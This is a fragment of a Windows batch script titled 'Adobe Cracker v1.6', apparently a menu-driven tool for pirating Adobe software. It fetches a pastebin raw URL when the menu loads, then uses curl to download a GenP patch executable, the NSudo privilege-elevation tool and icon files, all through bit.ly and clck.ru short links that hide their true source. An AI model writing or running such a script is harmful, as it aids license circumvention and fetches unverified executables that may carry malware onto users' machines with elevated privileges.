...
:: Менюшка
color 3
title Adobe Cracker v1.6

:menu
curl https://pastebin.com/raw/30zt5svh
echo Adobe Cracker v1.6 by entitybtw                                                                                                                                                           
echo Select Option:
...
if %choice%==1 (
    ...
    mkdir Adobe_Genp
    cd Adobe_Genp
    curl -L -o Adobe-GenP-3.0.exe http://bit.ly/genp3
    curl -L -o NSudo.exe https://bit.ly/nsudo1
    mkdir ICONS
    cd ICONS
    curl -L -o Cure.bmp https://clck.ru/38E2iJ
    curl -L -o Skull.ico https://clck.ru/38E2kz
